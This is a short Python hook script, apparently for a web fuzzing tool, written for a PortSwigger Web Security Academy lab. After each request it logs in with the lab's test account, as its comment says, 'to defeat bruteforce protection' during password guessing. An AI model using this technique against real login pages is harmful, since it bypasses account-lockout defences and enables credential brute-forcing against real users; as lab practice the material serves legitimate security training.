"""
I have access to data which follows the structure:
    - 'code': response.status_code,
    - 'chars': len(response.text),
    - 'response_time': response.elapsed.total_seconds(),
    - 'payload': payload,
    - 'words': len(response.text.split()),
    - 'idx' : idx,
    - 'show_response': show_response
"""
import requests
from typing import Dict, Any

def condition(data: Dict[str, Any]) -> bool:
    """
    Optional: Return True if the script should execute for this response
    If not defined, the script will execute for all responses
    """
    # Example: Run every request
    return True

def execute(data: Dict[str, Any]):
    """
    Main execution function that runs after each request
    """
    # Login to defeat bruteforce protection
    credentials = {
        'username': 'wiener',
        'password': 'peter'
    }
    response = requests.post('https://0a3100ff0382720182647ef4006100c2.web-security-academy.net/login', data=credentials)
